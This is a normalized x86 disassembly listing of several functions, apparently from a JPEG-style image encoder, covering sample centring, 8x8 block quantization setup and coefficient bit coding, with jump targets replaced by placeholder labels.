sub_42ff70
push ebp
mov ebp esp
sub esp 0x168
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x130 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x138 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx ]
mov [ edx + 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xbc ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x12c ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call sub_42f950
add esp 0x8
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
add edx [ eax + 0x3c ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x12c ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx * 4 + r--data ]
mov eax [ ebp - 0x28 ]
movsx ecx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x24 ]
sar eax cl
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ ebp + ecx * 4 - 0x128 ] edx
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
mov edx [ ebp - 0x8 ]
neg edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0xc ] 0x0
jg r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + edx * 4 - 0x128 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
add ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x7fff
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
cmp [ ebp - 0xc ] 0xf
jle r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x4 ]
push edx
call sub_42faa0
add esp 0x4
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x3c ] 0x3a9
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x4 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xbc ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov al 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_42faa0
add esp 0x4
mov edx [ ebp - 0xc ]
shl edx 0x4
add edx 0x1
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_42f8d0
add esp 0xc
mov eax [ ebp - 0x10 ]
mov ecx [ eax * 4 + r--data ]
mov edx [ ebp - 0x28 ]
movsx eax [ edx + ecx * 2 ]
xor ecx ecx
test eax eax
setge cl
mov [ ebp - 0x8 ] ecx
push 0x1
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call sub_42f700
add esp 0xc
mov ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call sub_42fb80
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and ecx 0x1
mov edx [ ebp - 0x18 ]
add edx [ ebp - 0x1c ]
mov [ edx ] cl
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_42faa0
add esp 0x4
push 0xf0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call sub_42f8d0
add esp 0xc
mov ecx [ ebp - 0xc ]
sub ecx 0x10
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_42fb80
add esp 0xc
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x44 ]
sub edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xbc ]
mov [ ecx + 0x44 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x48 ]
add edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x48 ]
and edx 0x7
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] edx
sub_430290
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax ]
mov [ ecx + 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
mov [ edx + 0x14 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_42faa0
add esp 0x4
mov edx [ ebp - 0x4 ]
push edx
call sub_42fa60
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x4 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430300
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_42faa0
add esp 0x4
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ eax + 0x12c ] 0x0
sete cl
mov [ ebp - 0x8 ] cl
push 0x4
push 0x0
lea edx [ ebp - 0x1c ]
push edx
call memset
add esp 0xc
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
cmp edx [ ecx + 0xe4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xe8 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x8 ]
and eax 0xff
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x18 ]
mov [ ebp - 0x10 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x134 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
and edx 0xff
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax * 4 + 0x68 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax * 4 + 0x58 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ ebp + eax - 0x1c ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x5c ]
push edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42df10
add esp 0xc
mov eax [ ebp - 0x10 ]
mov [ ebp + eax - 0x1c ] 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_420c30
add esp 0x4
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
sub_430430
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push 0x30
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x158 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_430520
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb8 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_4307c0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] sub_4346f0
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_4307c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] sub_434360
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
je r-xdata
cmp [ ebp - 0x8 ] 0x4
jge r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_430b70
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1c ] sub_433ff0
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0xc ] 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x20 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x30
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_430520
push ebp
mov ebp esp
sub esp 0x70
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x158 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x3c ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x34
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp [ ebp - 0xc ] 0x4
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ edx + ecx * 4 + 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x48 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0xc ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
push 0x100
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0xc ] eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
cmp [ ecx + eax * 4 + 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x2
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x48 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xb8 ]
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x40
jge r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0xc ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
push 0x100
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
cmp [ eax + edx * 4 + 0x20 ] 0x0
jne r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
xor eax eax
mov ax [ edx + ecx * 2 ]
shl eax 0x3
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x40
jge r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x20 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
push 0x100
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x30
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dx [ ecx + eax * 2 ]
mov eax [ ebp - 0x10 ]
movsx ecx [ eax * 2 + r--data ]
imul edx ecx
add edx 0x400
sar edx 0xb
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
cmp [ ebp - 0x24 ] 0x8
jge r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x54
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
cmp [ ebp - 0x28 ] 0x8
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x30 ] ecx
fild [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
fmul [ edx * 8 + r--data ]
mov eax [ ebp - 0x28 ]
fmul [ eax * 8 + r--data ]
fmul [ r--data ]
fdivr [ r--data ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x20 ]
fstp [ edx + ecx * 4 ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
sub_4307c0
push ebp
mov ebp esp
sub esp 0x16c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x158 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0xc ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x18 ]
mov eax [ ebp + 0x10 ]
lea ecx [ eax + edx * 4 ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x110 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x110 ]
cmp ecx [ ebp + 0x20 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10c ]
mov [ ebp - 0x114 ] edx
mov [ ebp - 0x11c ] 0x0
jmp r-xdata
cmp [ ebp - 0x11c ] 0x8
jge r-xdata
lea edx [ ebp - 0x10c ]
push edx
call [ ebp - 0x8 ]
add esp 0x4
mov eax [ ebp - 0x110 ]
shl eax 0x7
mov ecx [ ebp + 0x14 ]
add ecx eax
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x128 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x11c ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 ]
add eax [ ebp + 0x1c ]
mov [ ebp - 0x118 ] eax
mov ecx [ ebp - 0x118 ]
xor edx edx
mov dl [ ecx ]
sub edx 0x80
mov eax [ ebp - 0x114 ]
mov [ eax ] edx
mov ecx [ ebp - 0x114 ]
add ecx 0x4
mov [ ebp - 0x114 ] ecx
mov edx [ ebp - 0x118 ]
add edx 0x1
mov [ ebp - 0x118 ] edx
mov eax [ ebp - 0x118 ]
xor ecx ecx
mov cl [ eax ]
sub ecx 0x80
mov edx [ ebp - 0x114 ]
mov [ edx ] ecx
mov eax [ ebp - 0x114 ]
add eax 0x4
mov [ ebp - 0x114 ] eax
mov ecx [ ebp - 0x118 ]
add ecx 0x1
mov [ ebp - 0x118 ] ecx
mov edx [ ebp - 0x118 ]
xor eax eax
mov al [ edx ]
sub eax 0x80
mov ecx [ ebp - 0x114 ]
mov [ ecx ] eax
mov edx [ ebp - 0x114 ]
add edx 0x4
mov [ ebp - 0x114 ] edx
mov eax [ ebp - 0x118 ]
add eax 0x1
mov [ ebp - 0x118 ] eax
mov ecx [ ebp - 0x118 ]
xor edx edx
mov dl [ ecx ]
sub edx 0x80
mov eax [ ebp - 0x114 ]
mov [ eax ] edx
mov ecx [ ebp - 0x114 ]
add ecx 0x4
mov [ ebp - 0x114 ] ecx
mov edx [ ebp - 0x118 ]
add edx 0x1
mov [ ebp - 0x118 ] edx
mov eax [ ebp - 0x118 ]
xor ecx ecx
mov cl [ eax ]
sub ecx 0x80
mov edx [ ebp - 0x114 ]
mov [ edx ] ecx
mov eax [ ebp - 0x114 ]
add eax 0x4
mov [ ebp - 0x114 ] eax
mov ecx [ ebp - 0x118 ]
add ecx 0x1
mov [ ebp - 0x118 ] ecx
mov edx [ ebp - 0x118 ]
xor eax eax
mov al [ edx ]
sub eax 0x80
mov ecx [ ebp - 0x114 ]
mov [ ecx ] eax
mov edx [ ebp - 0x114 ]
add edx 0x4
mov [ ebp - 0x114 ] edx
mov eax [ ebp - 0x118 ]
add eax 0x1
mov [ ebp - 0x118 ] eax
mov ecx [ ebp - 0x118 ]
xor edx edx
mov dl [ ecx ]
sub edx 0x80
mov eax [ ebp - 0x114 ]
mov [ eax ] edx
mov ecx [ ebp - 0x114 ]
add ecx 0x4
mov [ ebp - 0x114 ] ecx
mov edx [ ebp - 0x118 ]
add edx 0x1
mov [ ebp - 0x118 ] edx
mov eax [ ebp - 0x118 ]
xor ecx ecx
mov cl [ eax ]
sub ecx 0x80
mov edx [ ebp - 0x114 ]
mov [ edx ] ecx
mov eax [ ebp - 0x114 ]
add eax 0x4
mov [ ebp - 0x114 ] eax
mov ecx [ ebp - 0x118 ]
add ecx 0x1
mov [ ebp - 0x118 ] ecx
jmp r-xdata
cmp [ ebp - 0x128 ] 0x40
jge r-xdata
mov eax [ ebp - 0x11c ]
add eax 0x1
mov [ ebp - 0x11c ] eax
jmp r-xdata
mov eax [ ebp - 0x128 ]
mov ecx [ ebp - 0xc ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x128 ]
mov ecx [ ebp + eax * 4 - 0x10c ]
mov [ ebp - 0x120 ] ecx
cmp [ ebp - 0x120 ] 0x0
jge r-xdata
mov edx [ ebp - 0x110 ]
add edx 0x1
mov [ ebp - 0x110 ] edx
mov eax [ ebp + 0x1c ]
add eax 0x8
mov [ ebp + 0x1c ] eax
mov ecx [ ebp - 0x124 ]
sar ecx 0x1
mov edx [ ebp - 0x120 ]
add edx ecx
mov [ ebp - 0x120 ] edx
mov eax [ ebp - 0x120 ]
cmp eax [ ebp - 0x124 ]
jl r-xdata
mov edx [ ebp - 0x120 ]
neg edx
mov [ ebp - 0x120 ] edx
mov eax [ ebp - 0x124 ]
sar eax 0x1
mov ecx [ ebp - 0x120 ]
add ecx eax
mov [ ebp - 0x120 ] ecx
mov edx [ ebp - 0x120 ]
cmp edx [ ebp - 0x124 ]
jl r-xdata
mov [ ebp - 0x120 ] 0x0
mov eax [ ebp - 0x120 ]
cdq
idiv [ ebp - 0x124 ]
mov [ ebp - 0x120 ] eax
jmp r-xdata
mov [ ebp - 0x120 ] 0x0
mov eax [ ebp - 0x120 ]
cdq
idiv [ ebp - 0x124 ]
mov [ ebp - 0x120 ] eax
jmp r-xdata
mov edx [ ebp - 0x128 ]
add edx 0x1
mov [ ebp - 0x128 ] edx
mov ecx [ ebp - 0x128 ]
mov edx [ ebp - 0x12c ]
mov ax [ ebp - 0x120 ]
mov [ edx + ecx * 2 ] ax
jmp r-xdata
mov eax [ ebp - 0x120 ]
neg eax
mov [ ebp - 0x120 ] eax
jmp r-xdata
sub_430b70
push ebp
mov ebp esp
sub esp 0x188
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x158 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x20 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x18 ]
mov eax [ ebp + 0x10 ]
lea ecx [ eax + edx * 4 ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x110 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x110 ]
cmp ecx [ ebp + 0x20 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10c ]
mov [ ebp - 0x114 ] edx
mov [ ebp - 0x11c ] 0x0
jmp r-xdata
cmp [ ebp - 0x11c ] 0x8
jge r-xdata
lea edx [ ebp - 0x10c ]
push edx
call [ ebp - 0x8 ]
add esp 0x4
mov eax [ ebp - 0x110 ]
shl eax 0x7
mov ecx [ ebp + 0x14 ]
add ecx eax
mov [ ebp - 0x128 ] ecx
mov [ ebp - 0x124 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x11c ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 ]
add eax [ ebp + 0x1c ]
mov [ ebp - 0x118 ] eax
mov ecx [ ebp - 0x118 ]
xor edx edx
mov dl [ ecx ]
sub edx 0x80
mov [ ebp - 0x12c ] edx
fild [ ebp - 0x12c ]
mov eax [ ebp - 0x114 ]
fstp [ eax ]
mov ecx [ ebp - 0x114 ]
add ecx 0x4
mov [ ebp - 0x114 ] ecx
mov edx [ ebp - 0x118 ]
add edx 0x1
mov [ ebp - 0x118 ] edx
mov eax [ ebp - 0x118 ]
xor ecx ecx
mov cl [ eax ]
sub ecx 0x80
mov [ ebp - 0x130 ] ecx
fild [ ebp - 0x130 ]
mov edx [ ebp - 0x114 ]
fstp [ edx ]
mov eax [ ebp - 0x114 ]
add eax 0x4
mov [ ebp - 0x114 ] eax
mov ecx [ ebp - 0x118 ]
add ecx 0x1
mov [ ebp - 0x118 ] ecx
mov edx [ ebp - 0x118 ]
xor eax eax
mov al [ edx ]
sub eax 0x80
mov [ ebp - 0x134 ] eax
fild [ ebp - 0x134 ]
mov ecx [ ebp - 0x114 ]
fstp [ ecx ]
mov edx [ ebp - 0x114 ]
add edx 0x4
mov [ ebp - 0x114 ] edx
mov eax [ ebp - 0x118 ]
add eax 0x1
mov [ ebp - 0x118 ] eax
mov ecx [ ebp - 0x118 ]
xor edx edx
mov dl [ ecx ]
sub edx 0x80
mov [ ebp - 0x138 ] edx
fild [ ebp - 0x138 ]
mov eax [ ebp - 0x114 ]
fstp [ eax ]
mov ecx [ ebp - 0x114 ]
add ecx 0x4
mov [ ebp - 0x114 ] ecx
mov edx [ ebp - 0x118 ]
add edx 0x1
mov [ ebp - 0x118 ] edx
mov eax [ ebp - 0x118 ]
xor ecx ecx
mov cl [ eax ]
sub ecx 0x80
mov [ ebp - 0x13c ] ecx
fild [ ebp - 0x13c ]
mov edx [ ebp - 0x114 ]
fstp [ edx ]
mov eax [ ebp - 0x114 ]
add eax 0x4
mov [ ebp - 0x114 ] eax
mov ecx [ ebp - 0x118 ]
add ecx 0x1
mov [ ebp - 0x118 ] ecx
mov edx [ ebp - 0x118 ]
xor eax eax
mov al [ edx ]
sub eax 0x80
mov [ ebp - 0x140 ] eax
fild [ ebp - 0x140 ]
mov ecx [ ebp - 0x114 ]
fstp [ ecx ]
mov edx [ ebp - 0x114 ]
add edx 0x4
mov [ ebp - 0x114 ] edx
mov eax [ ebp - 0x118 ]
add eax 0x1
mov [ ebp - 0x118 ] eax
mov ecx [ ebp - 0x118 ]
xor edx edx
mov dl [ ecx ]
sub edx 0x80
mov [ ebp - 0x144 ] edx
fild [ ebp - 0x144 ]
mov eax [ ebp - 0x114 ]
fstp [ eax ]
mov ecx [ ebp - 0x114 ]
add ecx 0x4
mov [ ebp - 0x114 ] ecx
mov edx [ ebp - 0x118 ]
add edx 0x1
mov [ ebp - 0x118 ] edx
mov eax [ ebp - 0x118 ]
xor ecx ecx
mov cl [ eax ]
sub ecx 0x80
mov [ ebp - 0x148 ] ecx
fild [ ebp - 0x148 ]
mov edx [ ebp - 0x114 ]
fstp [ edx ]
mov eax [ ebp - 0x114 ]
add eax 0x4
mov [ ebp - 0x114 ] eax
mov ecx [ ebp - 0x118 ]
add ecx 0x1
